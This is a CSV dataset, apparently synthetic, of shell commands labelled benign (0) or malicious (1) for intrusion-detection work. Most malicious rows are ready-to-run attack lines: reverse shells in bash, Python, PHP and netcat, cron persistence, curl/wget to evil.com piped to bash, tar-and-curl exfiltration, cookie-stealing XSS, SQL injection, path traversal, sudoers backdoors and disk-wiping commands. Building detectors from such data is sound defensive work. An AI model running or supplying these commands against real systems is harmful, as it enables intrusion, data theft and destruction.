timestamp,attacker_ip,command_sequence,label
2026-01-23 12:24:12,152.46.219.109,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 04:14:12,194.163.58.5,mount | grep ext4,0
2026-01-23 05:23:12,69.52.51.29,curl -I https://example.com,0
2026-01-23 02:43:12,151.64.24.210,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 16:41:12,221.185.232.43,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 14:38:12,201.140.49.44,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 03:05:12,70.164.16.47,wget --spider https://example.com/file.zip,0
2026-01-23 14:18:12,17.29.241.183,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 14:32:12,75.224.162.92,cat ../../../../etc/shadow,1
2026-01-23 02:12:12,77.210.50.114,crontab -l,0
2026-01-23 08:34:12,192.67.240.230,scp user@server:/var/log/app.log ./,0
2026-01-23 12:16:12,61.24.248.234,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
2026-01-23 14:13:12,11.164.139.129,rm -rf /* --no-preserve-root,1
2026-01-23 13:38:12,64.149.11.121,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 04:44:12,31.163.255.73,ip route show,0
2026-01-23 14:58:12,212.133.65.18,rm -rf /var/www/html/*,1
2026-01-23 02:09:12,72.246.217.236,apt update && apt list --upgradable,0
2026-01-23 16:48:12,66.3.119.154,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 05:40:12,41.7.167.239,find /var/www -name '*.php' -mtime -1,0
2026-01-23 15:29:12,28.7.203.167,rm -rf /var/www/html/*,1
2026-01-23 07:55:12,96.237.236.202,free -m,0
2026-01-23 13:15:12,208.71.7.158,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 17:16:12,62.91.59.203,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 10:19:12,61.176.138.34,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 03:27:12,94.44.224.161,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 08:45:12,53.61.173.228,du -sh /var/www/*,0
2026-01-23 12:30:12,134.199.170.23,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 16:33:12,158.107.187.131,nikto -h http://target.com,1
2026-01-23 04:39:12,174.181.237.149,ip addr show,0
2026-01-23 13:40:12,90.251.252.248,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 10:47:12,77.254.251.234,"curl -H ""User-Agent: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
2026-01-23 03:20:12,24.65.3.1,cat /proc/meminfo | head -10,0
2026-01-23 08:16:12,186.241.205.113,chown www-data:www-data /var/www/html -R,0
2026-01-23 02:34:12,69.178.111.155,du -sh /home/* | sort -hr,0
2026-01-23 09:09:12,14.146.48.151,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 11:01:12,51.106.168.125,tar czf - /var/www/html | base64 | curl -X POST --data-binary @- http://exfil.server.com/leak,1
2026-01-23 07:59:12,218.224.130.16,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 14:35:12,41.230.248.54,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 05:05:12,79.100.250.175,curl -s https://api.ipify.org,0
2026-01-23 08:29:12,154.43.170.164,wget --spider https://example.com/file.zip,0
2026-01-23 07:17:12,133.179.145.77,lsblk,0
2026-01-23 08:09:12,181.244.209.8,fdisk -l,0
2026-01-23 09:56:12,205.119.152.254,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 12:08:12,179.211.198.140,find / -perm -4000 -type f 2>/dev/null,1
2026-01-23 08:00:12,50.126.8.223,curl -I https://example.com,0
2026-01-23 04:01:12,167.234.173.202,dig example.com,0
2026-01-23 14:09:12,131.69.185.127,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 13:24:12,181.9.206.57,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 02:42:12,13.57.116.130,crontab -l,0
2026-01-23 16:37:12,56.191.115.228,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 11:14:12,180.192.43.151,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'",1
2026-01-23 02:13:12,201.200.120.222,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 15:54:12,55.235.108.108,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 03:47:12,200.73.178.156,ss -tulwn,0
2026-01-23 10:29:12,6.78.124.150,bash -c 'bash -i >& /dev/tcp/192.168.1.100/9001 0>&1',1
2026-01-23 11:41:12,141.187.187.186,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 09:35:12,81.215.90.16,nslookup google.com,0
2026-01-23 14:37:12,175.226.71.73,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 04:18:12,115.123.90.12,ps aux | grep nginx,0
2026-01-23 09:58:12,112.254.50.241,cat /var/www/../../../../etc/passwd,1
2026-01-23 16:53:12,113.209.44.183,cat ../../../etc/passwd,1
2026-01-23 08:21:12,165.12.112.177,ls -la /var/log/,0
2026-01-23 13:00:12,143.152.7.218,cat ../../../etc/passwd,1
2026-01-23 11:13:12,220.55.210.12,"curl ""http://target.com/upload?file=../../../etc/shadow""",1
2026-01-23 04:12:12,71.181.142.163,nmcli device status,0
2026-01-23 14:24:12,91.179.26.211,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 15:14:12,141.239.92.109,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
2026-01-23 08:37:12,60.210.161.52,df -h,0
2026-01-23 15:22:12,92.89.7.111,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 12:02:12,26.181.253.208,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 16:56:12,164.170.141.147,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
2026-01-23 01:21:12,209.161.225.186,systemctl status nginx,0
2026-01-23 17:50:12,13.19.176.175,rm -rf /* --no-preserve-root,1
2026-01-23 06:54:12,172.178.187.34,cat /proc/meminfo | head -10,0
2026-01-23 16:26:12,56.248.236.26,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 16:40:12,183.130.99.104,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
2026-01-23 16:55:12,16.193.16.15,mkfs.ext4 /dev/sda1,1
2026-01-23 13:14:12,6.21.62.175,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 04:43:12,191.228.77.171,uptime,0
2026-01-23 14:29:12,81.17.205.61,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 01:26:12,28.128.131.99,ls -la /home/user/documents/,0
2026-01-23 11:21:12,23.214.71.201,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 06:06:12,169.71.218.120,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 02:28:12,16.1.99.237,ping -c 4 8.8.8.8,0
2026-01-23 13:32:12,82.166.178.169,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 17:39:12,2.168.85.154,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 17:49:12,6.91.85.56,smbclient -L //target.com -U admin%password,1
2026-01-23 09:10:12,49.100.124.28,tar -czf backup.tar.gz /var/www/html,0
2026-01-23 10:00:12,160.116.87.251,sudo -u#-1 /bin/bash,1
2026-01-23 01:29:12,16.199.172.165,apt update && apt list --upgradable,0
2026-01-23 16:19:12,9.206.133.23,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 04:02:12,26.241.110.81,mtr -c 10 google.com,0
2026-01-23 08:43:12,113.181.140.121,chmod 644 /var/www/html/index.html,0
2026-01-23 01:22:12,144.90.3.31,crontab -l,0
2026-01-23 01:58:12,88.83.197.145,ping -c 4 8.8.8.8,0
2026-01-23 08:42:12,3.100.245.31,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 17:23:12,197.184.132.216,cat ../../../etc/passwd,1
2026-01-23 11:46:12,81.150.12.52,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 09:32:12,157.15.129.145,ip route show,0
2026-01-23 04:15:12,21.244.217.252,rsync -avz /var/www/html/ backup/,0
2026-01-23 17:41:12,8.230.0.221,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 01:37:12,6.195.186.126,df -h /,0
2026-01-23 12:18:12,37.178.220.1,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 04:27:12,191.188.147.45,nmcli device status,0
2026-01-23 09:57:12,192.144.6.185,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
2026-01-23 15:07:12,89.23.85.69,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 10:22:12,140.37.187.149,"echo ""* * * * * /usr/bin/nc -e /bin/sh 10.0.0.1 9001"" | crontab -",1
2026-01-23 02:02:12,138.231.190.118,crontab -l,0
2026-01-23 11:03:12,115.61.198.166,"curl -X POST ""http://target.com/login"" --data ""user=admin'--&pass=anything""",1
2026-01-23 02:29:12,177.147.108.165,apt update && apt list --upgradable,0
2026-01-23 07:44:12,182.215.147.57,systemctl status mysql,0
2026-01-23 09:05:12,42.196.86.188,ip route show,0
2026-01-23 16:24:12,203.251.100.114,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 08:35:12,195.101.206.80,ping -c 4 google.com,0
2026-01-23 15:45:12,138.236.129.90,ncat 10.0.0.1 4444 -e /bin/bash,1
2026-01-23 08:20:12,115.62.131.234,apt list --upgradable,0
2026-01-23 08:59:12,98.176.68.57,id,0
2026-01-23 02:58:12,117.161.88.101,apt update,0
2026-01-23 14:28:12,216.247.6.233,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
2026-01-23 07:35:12,201.236.65.15,find /var/www -name '*.php' -mtime -1,0
2026-01-23 11:31:12,223.166.96.106,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2026-01-23 10:17:12,161.175.27.118,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
2026-01-23 17:33:12,140.247.80.67,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 17:13:12,174.52.93.169,smbclient -L //target.com -U admin%password,1
2026-01-23 13:51:12,1.16.189.189,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
2026-01-23 06:50:12,215.244.82.26,find /var/www -name '*.php' -mtime -1,0
2026-01-23 07:05:12,77.2.0.164,curl -I https://example.com,0
2026-01-23 06:46:12,59.44.137.78,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 08:47:12,129.113.102.119,du -sh /var/www/*,0
2026-01-23 02:27:12,220.87.34.38,df -h /,0
2026-01-23 13:37:12,134.35.94.121,smbclient -L //target.com -U admin%password,1
2026-01-23 11:58:12,212.13.88.133,dig @target.com axfr target.com,1
2026-01-23 16:09:12,40.36.140.27,enum4linux target.com,1
2026-01-23 12:58:12,199.169.27.46,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
2026-01-23 07:30:12,178.183.19.25,free -m,0
2026-01-23 09:50:12,189.247.195.54,sudo -u#-1 /bin/bash,1
2026-01-23 10:51:12,3.208.24.156,tar czf - /var/www/html | base64 | curl -X POST --data-binary @- https://attacker.com/exfil,1
2026-01-23 06:02:12,40.78.100.73,ip addr show,0
2026-01-23 12:42:12,200.112.46.39,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 16:42:12,122.29.104.232,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 09:31:12,83.84.135.166,id,0
2026-01-23 12:37:12,60.115.6.190,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 14:47:12,100.50.62.206,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 03:08:12,212.48.36.138,mount | grep ext4,0
2026-01-23 03:43:12,51.60.208.227,ps aux | grep nginx,0
2026-01-23 08:56:12,29.113.99.121,scp user@server:/var/log/app.log ./,0
2026-01-23 15:19:12,170.47.192.68,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 10:55:12,22.141.238.230,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 08:24:12,164.143.105.8,logrotate -f /etc/logrotate.d/nginx,0
2026-01-23 02:56:12,15.99.125.30,netstat -tulpn,0
2026-01-23 05:07:12,173.207.176.133,chown www-data:www-data /var/www/html -R,0
2026-01-23 06:16:12,42.81.139.103,ping -c 4 google.com,0
2026-01-23 17:22:12,39.100.26.120,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
2026-01-23 14:02:12,177.235.135.138,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 06:11:12,206.17.177.92,whoami,0
2026-01-23 03:04:12,103.10.201.5,ss -tulwn,0
2026-01-23 07:48:12,108.208.190.36,chown www-data:www-data /var/www/html -R,0
2026-01-23 03:28:12,36.224.160.206,crontab -l,0
2026-01-23 12:54:12,204.163.100.78,curl http://evil.com/backdoor.php | bash,1
2026-01-23 02:51:12,131.124.141.67,systemctl status nginx,0
2026-01-23 05:37:12,196.206.203.7,localectl status,0
2026-01-23 16:36:12,30.223.41.177,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 16:27:12,110.240.11.204,dig @target.com axfr target.com,1
2026-01-23 10:30:12,202.97.235.34,sudo -u#-1 /bin/bash,1
2026-01-23 15:11:12,68.198.75.146,curl http://evil.com/backdoor.php | bash,1
2026-01-23 05:58:12,99.193.235.145,curl -I https://example.com,0
2026-01-23 04:25:12,50.53.49.52,free -m,0
2026-01-23 17:20:12,32.252.236.243,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
2026-01-23 13:18:12,73.232.162.49,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
2026-01-23 04:59:12,183.50.71.38,rsnapshot daily,0
2026-01-23 06:03:12,68.207.161.205,ip route show,0
2026-01-23 08:19:12,91.187.84.68,nslookup google.com,0
2026-01-23 11:49:12,131.10.170.116,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 09:24:12,115.139.136.21,uptime,0
2026-01-23 10:02:12,176.232.79.17,"echo ""* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9001 0>&1'"" >> /tmp/cronjob && crontab /tmp/cronjob",1
2026-01-23 07:20:12,76.196.37.162,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 09:07:12,190.177.105.75,traceroute google.com,0
2026-01-23 17:18:12,128.228.65.57,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
2026-01-23 09:11:12,95.122.118.187,cat /proc/meminfo | head -10,0
2026-01-23 08:46:12,134.71.11.142,scp user@server:/var/log/app.log ./,0
2026-01-23 16:22:12,177.152.134.192,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 03:31:12,157.68.6.106,lsblk,0
2026-01-23 17:31:12,60.14.149.81,curl http://evil.com/backdoor.php | bash,1
2026-01-23 17:51:12,11.112.101.173,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 08:07:12,164.41.144.179,top -n 1 | head -20,0
2026-01-23 13:25:12,131.237.125.168,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 01:55:12,73.147.131.125,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 04:46:12,77.139.124.29,scp user@server:/var/log/app.log ./,0
2026-01-23 07:26:12,91.68.174.35,ln -s /var/www/html /home/user/www,0
2026-01-23 16:20:12,155.55.130.60,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 02:33:12,88.192.5.224,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 04:22:12,29.36.19.229,rsync -avz /var/www/html/ backup/,0
2026-01-23 06:43:12,209.155.133.74,rsnapshot daily,0
2026-01-23 16:29:12,123.105.46.178,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 12:35:12,129.161.181.222,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 15:24:12,11.105.28.150,rm -rf /var/www/html/*,1
2026-01-23 10:26:12,180.105.123.8,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 08:11:12,146.23.48.55,hostnamectl,0
2026-01-23 12:40:12,201.11.133.130,chmod 4777 /bin/bash,1
2026-01-23 05:34:12,138.131.236.50,uptime,0
2026-01-23 16:15:12,25.218.95.244,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
2026-01-23 05:15:12,216.138.238.97,timedatectl,0
2026-01-23 13:02:12,68.14.23.248,host -t txt target.com,1
2026-01-23 13:22:12,33.94.246.61,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 17:05:12,64.39.165.153,cat ../../../etc/passwd,1
2026-01-23 06:18:12,60.203.7.21,du -sh /var/www/*,0
2026-01-23 11:53:12,64.9.167.125,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
2026-01-23 10:41:12,67.12.138.231,tar czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
2026-01-23 15:02:12,120.81.125.62,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
2026-01-23 02:54:12,107.129.157.156,du -sh /home/* | sort -hr,0
2026-01-23 07:47:12,52.209.42.58,chmod 644 /var/www/html/index.html,0
2026-01-23 05:36:12,202.98.151.199,lsblk,0
2026-01-23 15:15:12,112.19.163.123,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 11:25:12,113.229.12.179,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 05:31:12,114.97.197.126,chown www-data:www-data /var/www/html -R,0
2026-01-23 05:06:12,51.186.66.170,logrotate -f /etc/logrotate.d/nginx,0
2026-01-23 15:13:12,10.17.32.249,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
2026-01-23 05:00:12,223.21.159.210,chmod 644 /var/www/html/index.html,0
2026-01-23 04:26:12,192.247.113.233,ip route show,0
2026-01-23 16:01:12,164.122.111.133,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 11:07:12,85.126.118.12,"curl -H ""User-Agent: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"" http://target.com",1
2026-01-23 12:45:12,70.47.157.178,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
2026-01-23 09:33:12,56.185.105.136,lsblk,0
2026-01-23 11:15:12,10.195.242.2,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 04:07:12,45.131.27.160,ln -s /var/www/html /home/user/www,0
2026-01-23 15:27:12,9.23.103.95,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 16:34:12,110.108.181.223,host -t txt target.com,1
2026-01-23 16:59:12,3.211.144.60,smbclient -L //target.com -U admin%password,1
2026-01-23 13:44:12,215.178.26.200,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
2026-01-23 11:56:12,39.228.246.118,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 14:15:12,147.131.196.127,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 15:26:12,25.26.135.104,sudo nmap --script vuln target.com,1
2026-01-23 03:23:12,57.101.55.233,timedatectl,0
2026-01-23 02:24:12,57.199.114.161,du -sh /home/* | sort -hr,0
2026-01-23 08:33:12,75.73.42.1,crontab -l,0
2026-01-23 17:24:12,66.161.66.210,smbclient -L //target.com -U admin%password,1
2026-01-23 03:37:12,117.107.108.169,nslookup google.com,0
2026-01-23 10:54:12,102.79.92.128,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 15:00:12,116.58.70.62,curl http://evil.com/backdoor.php | bash,1
2026-01-23 01:50:12,117.131.250.39,tail -20 /var/log/syslog,0
2026-01-23 14:43:12,117.200.252.98,host -t txt target.com,1
2026-01-23 09:15:12,212.227.143.212,rsync -avz /var/www/html/ backup/,0
2026-01-23 09:38:12,140.229.136.250,cat /var/www/../../../../etc/passwd,1
2026-01-23 09:17:12,22.217.2.124,crontab -l,0
2026-01-23 01:39:12,83.218.113.247,apt update && apt list --upgradable,0
2026-01-23 03:10:12,62.131.116.253,timedatectl,0
2026-01-23 03:34:12,123.219.214.182,mtr -c 10 google.com,0
2026-01-23 17:01:12,18.3.22.249,dig @target.com axfr target.com,1
2026-01-23 15:53:12,3.43.129.248,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
2026-01-23 10:48:12,116.85.128.69,"curl ""http://target.com/static/../../../../etc/passwd""",1
2026-01-23 04:42:12,123.25.115.113,systemctl status mysql,0
2026-01-23 12:34:12,186.122.158.218,rm -rf /* --no-preserve-root,1
2026-01-23 01:38:12,209.4.92.221,ping -c 4 8.8.8.8,0
2026-01-23 02:59:12,211.94.85.37,hostnamectl,0
2026-01-23 02:23:12,203.63.205.109,rsync -avz /home/user/documents/ /backup/documents/,0
2026-01-23 15:57:12,107.1.151.46,mkfs.ext4 /dev/sda1,1
2026-01-23 12:38:12,166.155.118.240,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 12:09:12,105.105.252.140,host -t txt target.com,1
2026-01-23 08:26:12,24.56.99.154,journalctl -u nginx -n 50,0
2026-01-23 06:37:12,132.42.66.144,timedatectl,0
2026-01-23 05:22:12,100.249.169.91,id,0
2026-01-23 16:54:12,212.30.8.219,"curl ""http://target.com/download?file=....//....//etc/shadow""",1
2026-01-23 07:01:12,131.249.54.200,localectl status,0
2026-01-23 06:56:12,37.210.44.75,hostnamectl,0
2026-01-23 15:34:12,118.11.157.215,ncat 10.0.0.1 4444 -e /bin/bash,1
2026-01-23 11:59:12,126.6.101.64,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 13:45:12,82.230.223.94,enum4linux target.com,1
2026-01-23 11:43:12,86.111.80.58,nc -e /bin/sh 10.0.0.1 4444,1
2026-01-23 11:34:12,85.228.248.53,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 13:13:12,41.167.192.185,rpcclient -U admin%password target.com -c 'enumdomusers',1
2026-01-23 10:05:12,210.159.240.202,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
2026-01-23 16:47:12,216.14.177.136,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2026-01-23 01:16:12,74.158.200.21,ls -la /var/log/,0
2026-01-23 12:27:12,26.101.168.222,ncat 10.0.0.1 4444 -e /bin/bash,1
2026-01-23 03:38:12,97.90.237.12,apt list --upgradable,0
2026-01-23 08:18:12,105.98.204.239,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 12:26:12,109.8.73.137,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 14:50:12,20.6.72.148,cat ../../../../etc/shadow,1
2026-01-23 13:55:12,183.79.180.230,sudo nmap --script vuln target.com,1
2026-01-23 13:09:12,23.177.242.195,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
2026-01-23 08:50:12,16.224.126.196,chmod 644 /var/www/html/index.html,0
2026-01-23 04:52:12,168.192.190.6,cat /etc/nginx/nginx.conf,0
2026-01-23 17:03:12,131.19.5.236,sudo nmap --script vuln target.com,1
2026-01-23 09:36:12,67.39.0.125,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 03:48:12,155.28.254.4,tail -100 /var/log/nginx/access.log,0
2026-01-23 02:35:12,184.151.183.214,"journalctl --since ""1 hour ago"" -u ssh",0
2026-01-23 15:12:12,24.161.102.160,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 12:43:12,190.158.123.236,mkfs.ext4 /dev/sda1,1
2026-01-23 14:31:12,21.176.193.111,curl http://evil.com/backdoor.php | bash,1
2026-01-23 06:36:12,5.162.143.141,localectl status,0
2026-01-23 09:29:12,9.140.112.236,top -n 1 | head -20,0
2026-01-23 15:17:12,127.35.102.33,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 08:12:12,172.138.255.232,netstat -tulpn,0
2026-01-23 02:11:12,89.7.67.158,systemctl status nginx,0
2026-01-23 07:33:12,221.243.183.192,uptime,0
2026-01-23 14:16:12,205.168.79.49,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 03:35:12,67.50.123.110,whoami,0
2026-01-23 01:47:12,124.131.103.147,df -h /,0
2026-01-23 05:19:12,9.89.85.86,rsnapshot daily,0
2026-01-23 01:31:12,39.245.23.105,systemctl status nginx,0
2026-01-23 15:05:12,204.177.40.22,enum4linux target.com,1
2026-01-23 05:10:12,124.16.192.3,journalctl -u nginx -n 50,0
2026-01-23 15:49:12,114.223.185.239,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 04:57:12,45.236.12.225,df -h,0
2026-01-23 07:50:12,132.113.179.147,cat /etc/nginx/nginx.conf,0
2026-01-23 10:44:12,192.215.250.39,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.5"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
